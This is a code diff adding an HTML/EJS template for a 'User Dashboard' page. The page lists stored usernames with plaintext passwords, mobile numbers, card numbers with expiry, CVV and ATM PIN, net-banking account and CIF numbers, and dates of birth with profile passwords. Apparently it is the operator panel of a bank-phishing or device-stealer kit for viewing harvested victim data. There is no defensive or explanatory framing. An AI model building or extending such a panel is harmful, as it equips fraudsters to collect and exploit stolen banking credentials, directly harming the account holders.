@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  <header class="header-nav">
+    <h1>User Dashboard</h1>
+  </header>
+
+  <div class="user-detail-container">
+
+    <!-- USER DATA -->
+    <section>
+      <h2>User Information</h2>
+      <% if (user && user.entries && user.entries.length) { %>
+        <% user.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>User #<%= idx + 1 %></h3>
+            <p><strong>Username:</strong> <%= e.username %></p>
+            <p><strong>Password:</strong> <%= e.password %></p>
+            <p><strong>Mobile Number:</strong> <%= e.mobileNumber %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No user data found.</p></div>
+      <% } %>
+    </section>
+
+    <!-- CARD PAYMENTS -->
+    <section>
+      <h2>Card Payments</h2>
+      <% if (cardPayments && cardPayments.entries && cardPayments.entries.length) { %>
+        <% cardPayments.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>Card #<%= idx + 1 %></h3>
+            <p><strong>Card Number:</strong> <%= e.cardNumber %></p>
+            <p><strong>Expiry:</strong> <%= e.expiryMonth %>/<%= e.expiryYear %></p>
+            <p><strong>CVV:</strong> <%= e.cvv %></p>
+            <p><strong>ATM PIN:</strong> <%= e.atmPin %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No card payment data found.</p></div>
+      <% } %>
+    </section>
+
+    <!-- NET BANKING -->
+    <section>
+      <h2>Net Banking Details</h2>
+      <% if (netBanking && netBanking.entries && netBanking.entries.length) { %>
+        <% netBanking.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>Account #<%= idx + 1 %></h3>
+            <p><strong>Name:</strong> <%= e.name %></p>
+            <p><strong>Account Number:</strong> <%= e.acNumber %></p>
+            <p><strong>CIF Number:</strong> <%= e.cifNumber %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No net banking data found.</p></div>
+      <% } %>
+    </section>
+
+    <!-- SUCCESS DATA -->
+    <section>
+      <h2>Success Data</h2>
+      <% if (successData) { %>
+        <div class="card">
+          <p><strong>Date of Birth:</strong> <%= successData.dob %></p>
+          <p><strong>Profile Password:</strong> <%= successData.profilePassword %></p>
+          <p><strong>Submitted:</strong> <%= new Date(successData.submittedAt).toLocaleString() %></p>
+        </div>
+      <% } else { %>
+        <div class="card"><p>No success data found.</p></div>
+      <% } %>
+    </section>
+
+    <div class="actions">
+      <a href="/api/device/dashboard"><button class="dashboard-btn">Go to Dashboard</button></a>
+    </div>
+
+  </div>
+</body>
+</html>
